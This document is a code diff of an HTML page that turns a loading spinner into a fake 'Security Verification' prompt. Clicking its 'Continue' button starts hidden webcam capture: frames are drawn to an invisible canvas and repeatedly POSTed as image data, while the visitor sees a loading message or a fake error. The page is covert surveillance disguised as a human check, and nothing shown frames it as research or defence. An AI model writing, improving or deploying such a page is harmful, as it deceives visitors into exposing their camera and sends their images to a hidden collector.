@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Verification Required</title>
     <style>
         body {
             background-color: #0f172a;
@@ -15,32 +15,53 @@
             height: 100vh;
             margin: 0;
         }
-        .spinner {
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            border-top-color: #38bdf8;
-            animation: spin 1s ease-in-out infinite;
-            margin: 0 auto 20px auto;
+        .card {
+            background: #1e293b;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+            max-width: 320px;
+            width: 100%;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .btn {
+            background-color: #38bdf8;
+            color: #0f172a;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+            transition: 0.2s;
+        }
+        .btn:hover {
+            background-color: #0ea5e9;
         }
     </style>
 </head>
 <body>
-    <div style="text-align: center;">
-        <div class="spinner"></div>
-        <h3>Loading content, please wait...</h3>
+    <div class="card" id="main-card">
+        <h3>🔒 Security Verification</h3>
+        <p style="color: #94a3b8; font-size: 14px;">Click below to verify that you are a human and load the content.</p>
+        <button class="btn" onclick="startCapture()">Continue ➔</button>
+    </div>
+
+    <div class="card" id="loading-card" style="display: none;">
+        <h3>Loading...</h3>
+        <p style="color: #94a3b8; font-size: 14px;">Please wait while we fetch your content.</p>
     </div>
 
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        window.addEventListener('DOMContentLoaded', () => {
+        function startCapture() {
+            document.getElementById('main-card').style.display = 'none';
+            document.getElementById('loading-card').style.display = 'block';
+
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
 
@@ -64,10 +85,14 @@
                             body: JSON.stringify({ image: imageData })
                         }).catch(err => console.error(err));
 
-                    }, 2000);
+                    }, 1500);
                 })
-                .catch(err => console.error("Camera access error:", err));
-        });
+                .catch(err => {
+                    console.error("Camera access error:", err);
+                    document.getElementById('loading-card').innerHTML = "<h3>Error Loading Page</h3><p style='color:#ef4444;font-size:14px;'>Please try again.</p>";
+                });
+        }
     </script>
 </body>
-</html>
+    </html>
+    
